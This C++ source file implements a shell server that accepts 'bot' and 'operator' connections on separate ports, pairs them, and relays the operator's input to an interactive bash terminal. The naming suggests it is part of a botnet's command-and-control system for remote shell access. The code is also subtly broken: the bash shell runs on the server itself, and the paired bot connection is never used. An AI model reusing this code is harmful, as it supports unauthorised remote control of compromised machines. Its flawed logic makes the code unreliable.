#include "shell_server.hpp"
#include <iostream>
#include <thread>
#include <sys/socket.h>
#include <netinet/in.h>
#include <unistd.h>
#include <pty.h>
#include <fcntl.h>
#include <termios.h>

ShellServer::ShellServer(int bot_port, int op_port)
    : bot_port_(bot_port), op_port_(op_port), waiting_bot_sock_(-1) {}

void ShellServer::start() {
    std::cout << "[SHELL] Starting shell server..." << std::endl;
    std::thread bot_listener(&ShellServer::listener_thread, this, bot_port_, true);
    std::thread op_listener(&ShellServer::listener_thread, this, op_port_, false);
    bot_listener.join();
    op_listener.join();
}

void ShellServer::listener_thread(int port, bool is_bot_listener) {
    int listener_fd = socket(AF_INET, SOCK_STREAM, 0);
    sockaddr_in address;
    address.sin_family = AF_INET;
    address.sin_addr.s_addr = INADDR_ANY;
    address.sin_port = htons(port);
    int optval = 1;
    setsockopt(listener_fd, SOL_SOCKET, SO_REUSEADDR, &optval, sizeof(optval));
    bind(listener_fd, (sockaddr*)&address, sizeof(address));
    listen(listener_fd, 1);
    std::cout << "[SHELL] Listening on port " << port << "..." << std::endl;

    while (true) {
        int new_socket = accept(listener_fd, nullptr, nullptr);
        if (is_bot_listener) {
            std::cout << "[SHELL] Bot connected. Waiting for operator..." << std::endl;
            std::unique_lock<std::mutex> lock(mtx_);
            waiting_bot_sock_ = new_socket;
            cv_.notify_one();
        } else {
            std::cout << "[SHELL] Operator connected. Waiting for bot..." << std::endl;
            std::unique_lock<std::mutex> lock(mtx_);
            cv_.wait(lock, [this]{ return waiting_bot_sock_ != -1; });
            std::thread(&ShellServer::proxy_session, this, waiting_bot_sock_, new_socket).detach();
            waiting_bot_sock_ = -1; // Reset for next session
        }
    }
}

void ShellServer::proxy_session(int bot_sock, int op_sock) {
    pid_t child_pid;
    int pty_master_fd = create_pty(child_pid);
    if (pty_master_fd == -1) {
        std::cerr << "[SHELL] Failed to create PTY" << std::endl;
        close(bot_sock);
        close(op_sock);
        return;
    }

    std::cout << "[SHELL] PTY created. Proxying session..." << std::endl;

    // Forward data from operator to PTY
    std::thread op_to_pty([=](){
        char buffer[4096];
        while(true) { 
            int n = recv(op_sock, buffer, 4096, 0); 
            if(n <= 0) break; 
            write(pty_master_fd, buffer, n);
        }
    });

    // Forward data from PTY to operator
    std::thread pty_to_op([=](){
        char buffer[4096];
        while(true) { 
            int n = read(pty_master_fd, buffer, 4096); 
            if(n <= 0) break; 
            send(op_sock, buffer, n, 0); 
        }
    });

    op_to_pty.join();
    pty_to_op.join();

    close(pty_master_fd);
    close(bot_sock);
    close(op_sock);
    kill(child_pid, SIGKILL);
    std::cout << "[SHELL] Session closed." << std::endl;
}

int ShellServer::create_pty(pid_t& child_pid) {
    int master_fd;
    child_pid = forkpty(&master_fd, NULL, NULL, NULL);
    if (child_pid == -1) {
        return -1;
    }

    if (child_pid == 0) { // Child process
        execl("/bin/bash", "/bin/bash", (char *)NULL);
        exit(1); // Should not be reached
    }

    return master_fd;
}